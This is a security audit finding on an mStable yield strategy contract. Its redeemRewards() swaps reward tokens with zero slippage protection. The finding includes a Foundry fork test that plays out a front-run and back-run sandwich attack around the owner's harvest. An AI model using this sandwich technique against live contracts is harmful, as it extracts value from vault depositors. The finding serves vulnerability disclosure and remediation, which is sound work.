### Title
Unprotected governance-token swap allows MEV extraction - (`contracts/strategies/mstable/IdleMStableStrategy.sol`)

### Summary
`redeemRewards()` invokes `_swapGovTokenOnUniswapAndDepositToVault(0)`, which forwards a zero `amountOutMin` to `swapExactTokensForTokens`. [1](#0-0)   
The swap uses `block.timestamp` as its deadline, so the missing-deadline half of the reported issue does not apply, but the hardcoded zero-slippage behavior does. [2](#0-1) 

### Finding Description
The owner-callable `redeemRewards()` path hardcodes `minLiquidityTokenToReceive` to zero, unlike the parameterized overload that decodes a minimum output from `_extraData`. [3](#0-2)   
`_swapGovTokenOnUniswapAndDepositToVault` swaps the strategy’s entire `govToken` balance and passes that zero minimum directly to the configured Uniswap V2 router. [4](#0-3)   
Because the recipient is the strategy itself, any unprivileged actor can sandwich the honest owner transaction: push the `uniswapRouterPath` output price downward before the harvest and restore it afterward, while the strategy accepts arbitrarily little output. [5](#0-4) 

### Impact Explanation
A sandwich bot can extract nearly the entire market value of the strategy’s pending `govToken` rewards, subject to pool liquidity and transaction ordering. [6](#0-5)   
The reduced output is then deposited into the vault and recorded as `totalLpTokensLocked`, permanently reducing the yield available to tranche holders. [7](#0-6) 

### Likelihood Explanation
The privileged `onlyOwner` restriction prevents an attacker from initiating the swap, but it does not prevent mempool observation and same-block reordering around the honest owner call. [1](#0-0)   
Using `block.timestamp` as the deadline prevents stale execution but provides no protection against an in-block sandwich. [8](#0-7)   
Likelihood therefore depends on the strategy accumulating a meaningful `govToken` balance and the configured router/path having sufficient liquidity for profitable manipulation. [9](#0-8) 

### Recommendation
Require the owner-facing `redeemRewards()` path to accept a nonzero `minLiquidityTokenToReceive`, or remove that overload and force callers through the parameterized implementation. [3](#0-2)   
The minimum output should be derived from an independent price check or supplied as a transaction parameter, and it should be validated against the full `govTokensToSend` balance before approval. [4](#0-3) 

### Proof of Concept
A Foundry mainnet-fork test can reproduce the issue by impersonating the strategy owner for the honest harvest call while a separate EOA performs the sandwich swaps. [1](#0-0) 

```solidity
// test/foundry/MStableRewardSandwich.t.sol
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

import "forge-std/Test.sol";
import "../../contracts/strategies/mstable/IdleMStableStrategy.sol";
import "../../contracts/interfaces/IUniswapV2Router02.sol";

contract MStableRewardSandwichTest is Test {
    IdleMStableStrategy strategy;
    IERC20Detailed govToken;
    IERC20Detailed underlying;
    IUniswapV2Router02 router;

    address owner;
    address attacker = address(0xBEEF);

    function testSandwichHardcodedZeroMinOut() public {
        // Fork a block where strategy.govToken(), strategy.underlyingToken(),
        // strategy.uniswapV2Router02() and strategy.owner() are populated.
        strategy = IdleMStableStrategy(vm.envAddress("MSTABLE_STRATEGY"));
        owner = strategy.owner();
        govToken = IERC20Detailed(strategy.govToken());
        underlying = IERC20Detailed(address(strategy.underlyingToken()));
        router = IUniswapV2Router02(strategy.uniswapV2Router02());

        // Credit reward tokens to the strategy, as if rewards were claimed.
        uint256 rewardAmount = vm.envUint("REWARD_AMOUNT");
        deal(address(govToken), address(strategy), rewardAmount);

        uint256 underlyingBefore = underlying.balanceOf(address(strategy));

        // Front-run: attacker sells govToken along strategy.uniswapRouterPath(),
        // pushing down the expected output received by the strategy.
        address[] memory path = strategy.uniswapRouterPath();
        deal(path[0], attacker, rewardAmount);
        vm.startPrank(attacker);
        IERC20Detailed(path[0]).approve(address(router), rewardAmount);
        router.swapExactTokensForTokens(
            rewardAmount,
            0,
            path,
            attacker,
            block.timestamp
        );
        vm.stopPrank();

        // Honest owner harvest uses the hardcoded zero minimum.
        vm.prank(owner);
        strategy.redeemRewards();

        // Back-run: attacker swaps in the reverse direction and captures the
        // difference created by the strategy's near-worthless output.
        address[] memory reversePath = new address[](path.length);
        for (uint256 i; i < path.length; ++i) {
            reversePath[i] = path[path.length - 1 - i];
        }

        uint256 attackerInput =
            IERC20Detailed(path[path.length - 1]).balanceOf(attacker);
        vm.startPrank(attacker);
        IERC20Detailed(path[path.length - 1]).approve(
            address(router),
            attackerInput
        );
        router.swapExactTokensForTokens(
            attackerInput,
            0,
            reversePath,
            attacker,
            block.timestamp
        );
        vm.stopPrank();

        // The harvest deposits substantially less value than the fair-market
        // reward value. Profit accounting should use acquired router output
        // and underlyingBefore as baselines for the chosen fork.
        assertLt(
            underlying.balanceOf(address(strategy)),
            underlyingBefore + vm.envUint("MIN_EXPECTED_VALUE")
        );
    }
}
```

The fork PoC requires concrete deployment addresses and a pool/path where the configured `govToken` can be priced and manipulated sufficiently; those values are deployment inputs rather than constants in this file. [10](#0-9)

### Citations

**File:** contracts/strategies/mstable/IdleMStableStrategy.sol (L132-145)
```text
    function redeemRewards() external onlyOwner returns (uint256[] memory rewards) {
        rewards = new uint256[](2);
        rewards[1] = _claimGovernanceTokens(0);
        rewards[0] = _swapGovTokenOnUniswapAndDepositToVault(0); // will redeem whatever possible reward is available
    }

    /// @notice redeem the rewards. Claims reward as per the _extraData
    /// @param _extraData must contain the minimum liquidity to receive, start round and end round round for which the reward is being claimed
    /// @return rewards amount of underlyings (mUSD) received after selling rewards and endRound
    function redeemRewards(bytes calldata _extraData) external override onlyIdleCDO returns (uint256[] memory rewards) {
        (uint256 minLiquidityTokenToReceive, uint256 endRound) = abi.decode(_extraData, (uint256, uint256));
        rewards = new uint256[](2);
        rewards[1] = _claimGovernanceTokens(endRound);
        rewards[0] = _swapGovTokenOnUniswapAndDepositToVault(minLiquidityTokenToReceive);
```

**File:** contracts/strategies/mstable/IdleMStableStrategy.sol (L259-278)
```text
    function _swapGovTokenOnUniswapAndDepositToVault(uint256 minLiquidityTokenToReceive) internal returns (uint256 _bal) {
        IERC20Detailed _govToken = IERC20Detailed(govToken);
        uint256 govTokensToSend = _govToken.balanceOf(address(this));
        IUniswapV2Router02 _uniswapV2Router02 = uniswapV2Router02;

        _govToken.approve(address(_uniswapV2Router02), govTokensToSend);
        _uniswapV2Router02.swapExactTokensForTokens(
            govTokensToSend,
            minLiquidityTokenToReceive,
            uniswapRouterPath,
            address(this),
            block.timestamp
        );

        _bal = underlyingToken.balanceOf(address(this));
        _depositToVault(_bal, false);
        // save the block in which rewards are swapped and the amount
        latestHarvestBlock = block.number;
        totalLpTokensLocked = _bal;
    }
```
